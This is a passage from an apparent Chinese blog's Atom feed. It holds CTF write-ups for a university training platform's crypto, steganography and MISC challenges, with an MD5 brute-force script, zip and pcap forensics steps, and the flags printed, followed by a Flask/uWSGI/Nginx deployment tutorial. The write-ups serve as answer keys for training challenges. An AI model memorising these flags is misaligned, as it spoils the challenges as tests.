<h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>python脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">s1 = <span class="string">'TASC'</span></div><div class="line">s2 = <span class="string">'O3RJMV'</span></div><div class="line">s3 = <span class="string">'WDJKX'</span></div><div class="line">s4 = <span class="string">'ZM'</span></div><div class="line">s = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">36</span>):</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">36</span>):</div><div class="line">            str1 = s1 + s[i] + s2 + s[j] + s3 + s[k] + s4</div><div class="line">            m = hashlib.md5()</div><div class="line">            m.update(str1)</div><div class="line">            res = m.hexdigest()</div><div class="line">            <span class="keyword">if</span> re.search(<span class="string">r'e9032[0-9a-f]&#123;3&#125;da[0-9a-f]&#123;3&#125;08[0-9a-f]&#123;4&#125;911513[0-9a-f]0[0-9a-f]&#123;3&#125;a2'</span>,res):</div><div class="line">                <span class="keyword">print</span> res</div></pre></td></tr></table></figure></p>
<p>运行脚本得到：<br>e9032994dabac08080091151380478a2<br>提交flag：<code>nctf{e9032994dabac08080091151380478a2}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;easy&quot;&gt;&lt;a href=&quot;#easy&quot; class=&quot;headerlink&quot; title=&quot;easy!&quot;&gt;&lt;/a&gt;easy!&lt;/h3&gt;&lt;p&gt;Base64解码：&lt;code&gt;nctf{this_is_base64_encode}&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;KeyBoard&quot;&gt;&lt;a href=&quot;#KeyBoard&quot; class=&quot;headerlink&quot; title=&quot;KeyBoard&quot;&gt;&lt;/a&gt;KeyBoard&lt;/h3&gt;&lt;p&gt;根据键盘的位置画图，可以看出是areuhack。（个人觉得a有点难看出来）&lt;br&gt;flag：&lt;code&gt;nctf{areuhack}&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>南京邮电大学网络攻防训练平台题解——隐写术</title>
    <link href="http://yoursite.com/2016/10/12/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E5%B9%B3%E5%8F%B0%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E9%9A%90%E5%86%99%E6%9C%AF/"/>
    <id>http://yoursite.com/2016/10/12/南京邮电大学网络攻防训练平台题解——隐写术/</id>
    <published>2016-10-12T11:38:49.000Z</published>
    <updated>2016-10-12T15:14:24.170Z</updated>
    
    <content type="html"><![CDATA[<h3 id="女神"><a href="#女神" class="headerlink" title="女神"></a>女神</h3><p>用UE打开拉到最后可看到flag：<code>nctf{pic_yin_xie_shu}</code></p>
<a id="more"></a>
<h3 id="图种"><a href="#图种" class="headerlink" title="图种"></a>图种</h3><p>用binwalk可以看出里面还藏着一个zip，里面还有一张gif。打开gif，按照题目要求，最后一句话的拼音首字母。<br>提交flag：<code>nctf{dssdcmlw}</code></p>
<h3 id="丘比龙De女神"><a href="#丘比龙De女神" class="headerlink" title="丘比龙De女神"></a>丘比龙De女神</h3><p>提示里面藏了一张图片。先用binwalk分析，没什么结果。用winhex打开，之后发现文件末尾有个nvshen.jpg。还有个文件zip压缩文件的尾部504B0506。<br>然后再搜索一下nvshen.jpg，上面也出现了一次。<br><img src="http://oexmgtl4i.bkt.clouddn.com/github.io/02.png" alt="Alt text"><br>然后还看到了上面红框那段，zip文件头的一部分。从这部分到文件尾部，抠出来，补上504B0304，然后将14000100改成14000000（去掉zip的伪加密），重命名为zip后缀。打开之后，解压密码为上面看到的love。就可以解压出图片了。然后放在kali里面计算图片md5值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Documents# md5sum nvshen.jpg</div><div class="line">a6caad3aaafa11b6d5ed583bef4d8a54  nvshen.jpg</div></pre></td></tr></table></figure></p>
<p>提交flag：<code>flag{a6caad3aaafa11b6d5ed583bef4d8a54}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;女神&quot;&gt;&lt;a href=&quot;#女神&quot; class=&quot;headerlink&quot; title=&quot;女神&quot;&gt;&lt;/a&gt;女神&lt;/h3&gt;&lt;p&gt;用UE打开拉到最后可看到flag：&lt;code&gt;nctf{pic_yin_xie_shu}&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="隐写术" scheme="http://yoursite.com/tags/%E9%9A%90%E5%86%99%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>南京邮电大学网络攻防训练平台题解——MISC</title>
    <link href="http://yoursite.com/2016/10/12/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E5%B9%B3%E5%8F%B0%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94MISC/"/>
    <id>http://yoursite.com/2016/10/12/南京邮电大学网络攻防训练平台题解——MISC/</id>
    <published>2016-10-12T11:31:04.000Z</published>
    <updated>2016-10-12T15:14:32.843Z</updated>
    
    <content type="html"><![CDATA[<h3 id="easy-wireshark"><a href="#easy-wireshark" class="headerlink" title="easy wireshark"></a>easy wireshark</h3><p>查看http流量，可以发现有个flag.php的请求，追踪TCP流可以获得flag：<code>nctf{wireshark_is_easy}</code><br><a id="more"></a><br><img src="http://oexmgtl4i.bkt.clouddn.com/github.io/01.png" alt="Alt text"></p>
<h3 id="wireshark-2"><a href="#wireshark-2" class="headerlink" title="wireshark 2"></a>wireshark 2</h3><p>分析http流的时候很容易发现有个secret.txt，打开之后可以看到内容：the password for zip file is : ZipYourMouth<br>那么接下来就是找zip了。然后可以发现上面有个flag.zip，尝试提取出来。发现提取出来是坏的，用winrar无法修复。<br>折腾了一阵然后就找writeup了。原来flag真的不在这里，坑。<br>在pcap文件中直接查找zip文件头Hex：504B0304，可以发现在1139行还有一个zip。里面有个flag.txt。<br>提取出来之后，用winrar修复，根据上面找到的压缩包密码就可以解压了。打开就是flag：Flag-qscet5234diQ。根据题目要求转换成小写就O了。最后提交flag：<code>flag-qscet5234diq</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;easy-wireshark&quot;&gt;&lt;a href=&quot;#easy-wireshark&quot; class=&quot;headerlink&quot; title=&quot;easy wireshark&quot;&gt;&lt;/a&gt;easy wireshark&lt;/h3&gt;&lt;p&gt;查看http流量，可以发现有个flag.php的请求，追踪TCP流可以获得flag：&lt;code&gt;nctf{wireshark_is_easy}&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="MISC" scheme="http://yoursite.com/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>Flask+uwsgi+Nginx部署应用</title>
    <link href="http://yoursite.com/2016/10/12/Flask-uwsgi-Nginx%E9%83%A8%E7%BD%B2%E5%BA%94%E7%94%A8/"/>
    <id>http://yoursite.com/2016/10/12/Flask-uwsgi-Nginx部署应用/</id>
    <published>2016-10-12T05:13:31.000Z</published>
    <updated>2016-10-12T13:15:45.123Z</updated>
    
    <content type="html"><![CDATA[<p>之前用Flask写了个网站，然后就想部署到云主机上。搜索了一番，决定采用的部署方案是：</p>
<ul>
<li>Web 服务器采用uWSGI</li>
<li>用Supervisor引用uwsgi 作为常规启动服务</li>
<li>基于Nginx作反向代理</li>
</ul>
<a id="more"></a>
<h2 id="安装Python环境，Flask"><a href="#安装Python环境，Flask" class="headerlink" title="安装Python环境，Flask"></a>安装Python环境，Flask</h2><p>在Vultr上申请了个云主机，系统采用Ubuntu 15.10。上来先安装python环境，安装pip、virtualenv。新建一个虚拟环境venv并激活：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wb@vultr:~/myBlog$ source venv/bin/activate</div><div class="line">(venv) wb@vultr:~/myBlog$</div></pre></td></tr></table></figure></p>
<p>接下来安装Flask和Flask的依赖，这个根据项目来定。<br>我项目的启动文件manage.py如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="keyword">if</span> os.path.exists(<span class="string">'.env'</span>):</div><div class="line">	print(<span class="string">'Importing environment from .env...'</span>)</div><div class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">'.env'</span>):</div><div class="line">		var = line.strip().split(<span class="string">'='</span>)</div><div class="line">		<span class="keyword">if</span> len(var) == <span class="number">2</span>:</div><div class="line">			os.environ[var[<span class="number">0</span>]] = var[<span class="number">1</span>]</div><div class="line"></div><div class="line"><span class="keyword">from</span> app <span class="keyword">import</span> create_app, db</div><div class="line"><span class="keyword">from</span> app.models <span class="keyword">import</span> User, Post</div><div class="line"><span class="keyword">from</span> flask.ext.script <span class="keyword">import</span> Manager,Shell</div><div class="line"></div><div class="line">app = create_app(os.getenv(<span class="string">'FLASK_CONFIG'</span>) <span class="keyword">or</span> <span class="string">'default'</span>)</div><div class="line">manager = Manager(app)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_shell_context</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> dict(app=app,db=db,User=User)</div><div class="line"></div><div class="line">manager.add_command(<span class="string">"shell"</span>,Shell(make_context=make_shell_context))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">	manager.run()</div></pre></td></tr></table></figure></p>
<p>所以运行Flask的方式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py runserver --host 0.0.0.0</div></pre></td></tr></table></figure></p>
<p>然后打开浏览器，输入你的云主机IP加端口号（5000）如：<code>1.2.3.4:5000</code>，就可以看到你的网站了。</p>
<h2 id="安装uWSGI"><a href="#安装uWSGI" class="headerlink" title="安装uWSGI"></a>安装uWSGI</h2><p>安装uWSGI的方式也很简单，pip安装即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(venv) wb@vultr:~/myBlog$pip install uwsgi</div></pre></td></tr></table></figure></p>
<p>安装完了之后就是配置了。在项目目录下新建<code>config.ini</code>，在<code>config.ini</code>中输入以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[uwsgi]</div><div class="line">master = true</div><div class="line">home = venv</div><div class="line">wsgi-file = manage.py</div><div class="line">callable = app</div><div class="line">socket = :3031</div><div class="line">processes = 4</div><div class="line">threads = 2</div><div class="line">buffer-size = 32768</div></pre></td></tr></table></figure></p>
<p>其中，<code>home</code>是虚拟环境的目录，<code>wsgi-file</code>是python启动文件，<code>callable=app</code>这个app是 manage.py 程序文件内的一个变量，这个变量的类型是 Flask的 application 类 。<code>socket</code>指定了启动时使用的端口。之前写的是<code>http = 0.0.0.0:3031</code>，但是发现运行不起来，查了stackflow之后改成了socket。<br>运行uwsgi：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(venv) wb@vultr:~/myBlog$uwsgi config.ini</div><div class="line">[uWSGI] getting INI configuration from config.ini</div><div class="line">*** Starting uWSGI 2.0.12 (64bit) on [Thu Apr 21 08:41:52 2016] ***</div><div class="line">compiled with version: 5.2.1 20151010 on 19 April 2016 02:03:42</div></pre></td></tr></table></figure></p>
<p>此时已经正常启动 uWSGI 并将 Flask 项目载入其中了，ctrl+c 关闭程序。此时在浏览器中输入<code>1.2.3.4:3031</code>就可以看到项目了。但这只是命令启动形式，关闭了就无法访问了。要使其随同服务器启动并作为后台服务运行才是运行环境的实际所需要。因此需要另外的工具引导uWSGI。</p>
<h2 id="安装supervisor"><a href="#安装supervisor" class="headerlink" title="安装supervisor"></a>安装supervisor</h2><p>我们使用supervisor引导uWSGI。安装方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install supervisor</div></pre></td></tr></table></figure></p>
<p>supervisor的全局配置文件在<code>/etc/supervisor/supervisor.conf</code>中，但是我们一般不改动，我们新建一个文件<code>blog_supervisor.conf</code>放在<code>/etc/supervisor/conf.d</code>目录下，里面输入以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[program:blog] </div><div class="line"># 启动命令入口 </div><div class="line">command=/home/wb/myBlog/venv/bin/uwsgi /home/wb/myBlog/config.ini            </div><div class="line"># 命令程序所在目录 </div><div class="line">directory=/home/wb/myBlog</div><div class="line">#运行命令的用户名 </div><div class="line">user=wb</div><div class="line">autostart=true</div><div class="line">autorestart=true</div><div class="line">#日志地址 </div><div class="line">stdout_logfile=/home/wb/myBlog/logs/uwsgi_supervisor.log</div></pre></td></tr></table></figure></p>
<p>启动supervisor服务：<code>sudo service supervisor start</code></p>
<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><p>Nginx是个著名的反向代理服务器。安装方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install nginx</div></pre></td></tr></table></figure></p>
<p>配置文件在<code>/etc/nginx/sites-available</code>中的<code>default</code>中，将其替换掉即可。新的<code>default</code>文件内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">server &#123; </div><div class="line">  listen 80; </div><div class="line">  server_name X.X.X.X; #公网地址 </div><div class="line">  location / &#123; </div><div class="line">  include uwsgi_params;</div><div class="line">  uwsgi_pass 127.0.0.1:3031; # 指向uwsgi 所应用的内部地址,所有请求将转发给uwsgi 处理 </div><div class="line">  uwsgi_param UWSGI_PYHOME /home/wb/myBlog/venv; # 指向虚拟环境目录 </div><div class="line">  uwsgi_param UWSGI_CHDIR /home/wb/myBlog; # 指向网站根目录 </div><div class="line">  uwsgi_param UWSGI_SCRIPT manage:app; # 指定启动程序</div><div class="line">  uwsgi_read_timeout 100; </div><div class="line"> &#125;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>重启Nginx服务：<code>sudo service nginx restart</code><br>这时候打开浏览器，输入你的主机IP，就可以看到你的项目了。</p>
<p>参考：<a href="http://www.cnblogs.com/Ray-liang/p/4173923.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">http://www.cnblogs.com/Ray-liang/p/4173923.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前用Flask写了个网站，然后就想部署到云主机上。搜索了一番，决定采用的部署方案是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web 服务器采用uWSGI&lt;/li&gt;
&lt;li&gt;用Supervisor引用uwsgi 作为常规启动服务&lt;/li&gt;
&lt;li&gt;基于Nginx作反向代理&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Flask" scheme="http://yoursite.com/categories/Flask/"/>
    
    
      <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
      <category term="Nginx" scheme="http://yoursite.com/tags/Nginx/"/>
    
  </entry>
  
</feed>
